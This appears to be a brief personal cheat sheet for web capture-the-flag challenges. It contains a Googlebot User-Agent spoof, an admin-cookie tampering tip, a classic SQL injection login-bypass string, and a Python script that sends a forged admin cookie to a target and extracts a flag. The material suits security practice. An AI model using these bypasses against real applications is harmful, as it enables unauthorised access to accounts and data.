# Ch34tsh33t
My CheatSheet


*Always check the Http method needed. Below are the list of HTTP Methods*
-POST
-GET
-PUT
-PATCH
-DELETE


*Using Google as secret-agent*
headers = {
	'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
}


*If No Login was provided but Admin login is available*
Try using cookie "admin" set it to "true"



*SQL Injection"
' OR '1'='1' --







*Python Code To get http request*

#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('{TARGET IP}', data=params, cookies=jar)
source = r.text
print re.findall(r'(flag\{.+\})', source)[0]
